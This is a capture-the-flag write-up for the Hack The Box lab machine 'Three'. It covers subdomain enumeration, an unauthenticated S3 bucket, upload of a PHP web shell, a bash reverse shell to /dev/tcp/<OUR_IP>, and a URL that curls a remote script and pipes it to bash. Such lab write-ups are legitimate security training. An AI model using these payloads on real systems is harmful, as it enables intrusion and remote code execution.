# Three

#### Difficulty:<code>Very Easy</code>

#### Machine Tags
  Cloud  
  Custom Applications  
  AWS  
  Reconnaissance  
  Website Structure Discovery  
  Bucket Enumeration  
  Arbitrary File Upload  
  Anon/Guest Access  

#### Description
  The website we are seeking to penetrate is hosted on AWS and used S3 buckets for cloud-storage. Configured poorly, S3 buckets can be exploited. 

#### **Enumeration**
  To find out open ports we conduct a simple nmap. We find that ports 22 and 80 are open. Meaning that there is possibly a web interface to view if we try the IP on a browser. 

#### **Sub-domain Enumeration**
  A ***subdomain*** is an additional piece of information added to the beginning to a website's domain name. It allows websites to separate and organize content. *Host-based* or *virtual host* routing makes it possible for one server to handle multiple subdomains.  The *HOST* header in an HTTP request is used to determine which application to handle the request. There are different enumeration tools for finding sub-domains like <code>gobuster, wfuzz, feroxbuster</code>, in Gobuster a command for this would look like:
  ```
    gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
    
    vhost : use VHOST for brute-forcing
    -w    : path to the wordlist
    -u    : specify the URL
  ```

#### **S3 Buckets**
  **S3** is a cloud-based object storage service and have various uses like backup, storage, media hosting, software delivery, static websites, etc. Files stored in S3 buckets are called *S3 objects*. For interacting with S3 buckets, use <code>awscli</code>. Starting with <code>aws configure</code>, it will prompt for access key ID, secret access key, default region name, and default output format. These can be set to anything as they are not often configured to check for authentication. Using:
  ```
    aws --endpoint=http://s3.thetoppers.htb s3 ls
  ```
  To list all S3 buckets hosted by the server using ls command. To further investigate the buckets that are returned we can append <code>s3://{bucket}</code>. Since we have access to the remote bucket, we have the option of uploading files. Meaning we can potentially achieve remote code execution. 

#### **Approach to Remote Code Execution**
  We know that the application is using PHP. The following command allows the function to take the URL parameter, cmd, as input and executes it. 
  ``` PHP
    <[?]php s y s t e m($_GET["cmd"]); [?]> // had to defang a bit bc it was triggering windows defender 
  ```
  After uploading this bit of code, we can navigate to it in the browser and use the cmd parameter to run code. Through a *reverse shell* we will have the remote host connect back to our machine IP on a specified listening port, in this case tun0. The script for the reverse shell looks like:
  ``` python
    '''Bash reverse shell script'''
    bash -i >& /dev/tcp/<OUR_IP>/1337 0>&1

    '''Start ncat server on port'''
    nc -nvlp 1337

    '''Start web server on local to host shell script'''
    python3 -m http.server 8000

    http://{domain}.htb/{shell.php}?cmd=curl%20{YOUR_IP_ADDRESS}:8000/{shell.sh}|bash
  ```
  For the reverse shell after these are set up, we can use the URL parameter to fetch the bash file on our server then execute it. The link template is above. 